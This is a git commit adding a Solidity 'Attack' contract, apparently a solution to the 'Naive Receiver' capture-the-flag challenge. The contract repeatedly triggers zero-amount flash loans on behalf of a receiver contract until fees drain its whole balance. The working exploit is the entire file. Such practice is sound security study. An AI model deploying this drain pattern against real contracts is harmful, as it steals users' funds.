b523487c338feab6cb2dab7b808564614612354f
Nnaemeka Umeh (fps) <anthony.nnaemeka.umeh@gmail.com>
2022-06-09 21:00:10 +0100

    Add files via upload

---
+++ Naive Receiver/contracts/Attack.sol
@@ -0,0 +1,42 @@
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.6.0;
+import "./FlashLoanReceiver.sol";
+import "./NaiveReceiverLenderPool.sol";
+
+/*
+* @title: 
+* @author: Anthony (fps) https://github.com/fps8k .
+* @dev: 
+*/
+
+contract Attack
+{
+    FlashLoanReceiver public flash_loan_receiver;
+    NaiveReceiverLenderPool public naive_receiver_lender_pool;
+
+    function initialize(address _flash, address _naive) public
+    {
+        flash_loan_receiver = FlashLoanReceiver(payable(_flash));
+        naive_receiver_lender_pool = NaiveReceiverLenderPool(payable(_naive));
+    }
+
+    function viewFlashLoanBalance() public view returns(uint256)
+    {
+        return address(flash_loan_receiver).balance;
+    }
+
+    function viewNaiveReceiverLenderPoolBalance() public view returns(uint256)
+    {
+        return address(naive_receiver_lender_pool).balance;
+    }
+
+    function execute() public
+    {
+        uint256 j = address(flash_loan_receiver).balance;
+        while (j > 0)
+        {
+            naive_receiver_lender_pool.flashLoan(address(flash_loan_receiver), 0);
+            j = address(flash_loan_receiver).balance;
+        }
+    }
+}
